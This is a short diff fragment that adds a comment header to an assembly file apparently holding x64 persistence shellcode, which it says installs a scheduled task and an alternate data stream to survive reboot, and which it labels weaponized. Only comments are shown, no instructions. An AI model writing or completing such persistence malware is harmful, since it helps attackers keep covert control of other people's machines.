@@ -1,3 +1,10 @@
+; ========================================================
+; Persistence Shellcode – installs scheduled task + ADS, survives reboot
+; File: persistence.asm
+; Created: 2026-02-20
+; Purpose: x64 shellcode
+; WARNING: Weaponized code – handle with extreme care.
+; ========================================================
 ; -----------------------------------------------------------------------------
 ; Persistence Shellcode (x64)
 ; Fully position-independent, null-free code, robust error handling,
